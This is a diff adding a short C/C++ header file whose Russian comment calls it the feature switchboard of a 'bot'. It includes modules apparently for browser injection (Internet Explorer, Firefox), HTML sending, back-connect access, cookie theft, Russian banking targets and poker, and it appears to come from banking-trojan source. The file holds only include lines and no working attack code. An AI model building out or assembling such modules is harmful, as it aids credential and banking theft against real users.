@@ -1,0 +1,17 @@
+
+/*--------------------------------------------------------------------------*/
+//
+//  Заголовочный файл объединяющий в себе включаемы/отключаемые возможности
+//  бота.
+//
+/*--------------------------------------------------------------------------*/
+
+#include "InternetExplorer.h"
+#include "Firefox.h"
+#include "HTMLSend.h"
+#include "BackConnect.h"
+//#include "StealthBrowser.h"
+#include "coocksol.h"
+//#include "HistoryAnalizer.h"
+#include "RuBnk\RuBnk.h"
+#include "Poker.h"
